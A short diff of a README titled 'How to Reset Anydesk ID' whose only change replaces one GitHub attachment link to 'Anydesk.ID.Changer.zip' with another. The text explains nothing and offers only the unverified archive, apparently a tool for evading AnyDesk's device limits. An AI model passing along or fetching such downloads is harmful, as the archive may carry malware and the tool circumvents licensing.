@@ -1,6 +1,7 @@
 # How to Reset Anydesk ID
 
-### Download Anydesk ID Changer: [Anydesk.ID.Changer.zip](https://github.com/user-attachments/files/17900290/Anydesk.ID.Changer.zip)
+### Download Anydesk ID Changer: [Anydesk.ID.Changer.zip](https://github.com/user-attachments/files/17939802/Anydesk.ID.Changer.zip)
+
 
 
 
